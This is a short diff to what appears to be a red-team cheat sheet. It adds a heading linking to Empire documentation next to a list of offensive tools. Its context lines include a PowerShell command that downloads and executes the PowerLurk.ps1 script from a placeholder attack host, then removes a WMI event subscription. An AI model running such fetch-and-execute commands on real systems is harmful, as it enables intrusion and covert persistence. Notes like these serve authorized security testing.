@@ -229,6 +229,8 @@ PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://[Attack Host]/Powe
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerLurk.ps1'); Get-WmiEvent -Name CalcExec | Remove-WmiObject
 ```
 
+# [Empire](Empire/README.md)
+
 # Tools
 ##### [Empire](https://github.com/EmpireProject/Empire)
 ##### [Get-HttpStatus](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
